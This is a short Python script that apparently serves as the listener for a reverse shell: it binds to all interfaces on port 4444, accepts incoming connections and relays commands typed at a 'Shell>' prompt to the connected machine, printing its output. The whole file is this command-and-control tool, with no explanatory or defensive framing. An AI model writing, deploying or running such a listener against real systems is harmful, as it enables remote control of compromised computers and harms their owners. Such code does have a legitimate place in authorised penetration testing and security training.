import socket

def start_server(host='0.0.0.0', port=4444):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    print(f"Listening on {host}:{port}")

    while True:
        client_socket, addr = server.accept()
        print(f"Connection from {addr}")
        
        while True:
            command = input("Shell> ")
            if command.lower() == 'exit':
                client_socket.send(b'exit')
                client_socket.close()
                break
            
            client_socket.send(command.encode())
            response = client_socket.recv(4096)
            print(response.decode(), end='')

if __name__ == '__main__':
    start_server()
